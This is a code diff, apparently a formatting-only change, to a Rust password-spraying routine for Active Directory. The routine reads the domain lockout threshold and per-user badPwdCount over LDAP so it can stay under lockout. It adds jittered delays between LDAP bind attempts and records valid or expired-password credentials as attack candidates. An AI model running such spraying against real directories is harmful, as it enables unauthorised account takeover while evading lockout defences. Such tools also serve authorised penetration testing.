@@ -167,9 +167,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
 
             // Per-user badPwdCount check (only when policy is enabled)
             if spray.check_policy && lockout_threshold > 0 {
-                let bad = query_bad_pwd_count(hunt, username)
-                    .await
-                    .unwrap_or(0);
+                let bad = query_bad_pwd_count(hunt, username).await.unwrap_or(0);
                 if bad >= safe_limit {
                     warn!(
                         "Spray: skipping {username} (badPwdCount={bad} ≥ safe_limit={safe_limit})"
@@ -185,10 +183,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
             } else {
                 0
             };
-            tokio::time::sleep(tokio::time::Duration::from_millis(
-                spray.delay_ms + jitter,
-            ))
-            .await;
+            tokio::time::sleep(tokio::time::Duration::from_millis(spray.delay_ms + jitter)).await;
 
             // Bind attempt
             result.attempts += 1;
@@ -218,9 +213,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                 BindOutcome::PasswordExpired => {
                     // Wrong-password-that-expired still means the account exists
                     // and the cred might be useful for other attacks
-                    info!(
-                        "Spray: {username} — password expired (recording as valid candidate)"
-                    );
+                    info!("Spray: {username} — password expired (recording as valid candidate)");
                     result
                         .valid_creds
                         .push((username.clone(), password.clone()));
@@ -334,11 +327,7 @@ async fn query_lockout_threshold(hunt: &HuntConfig) -> Result<u32> {
     let mut ldap = open_operator_ldap(hunt).await?;
     let base_dn = hunt.derive_base_dn();
     let entries = ldap
-        .custom_search_with_base(
-            &base_dn,
-            "(objectClass=domainDNS)",
-            &["lockoutThreshold"],
-        )
+        .custom_search_with_base(&base_dn, "(objectClass=domainDNS)", &["lockoutThreshold"])
         .await?;
     let threshold = entries
         .first()
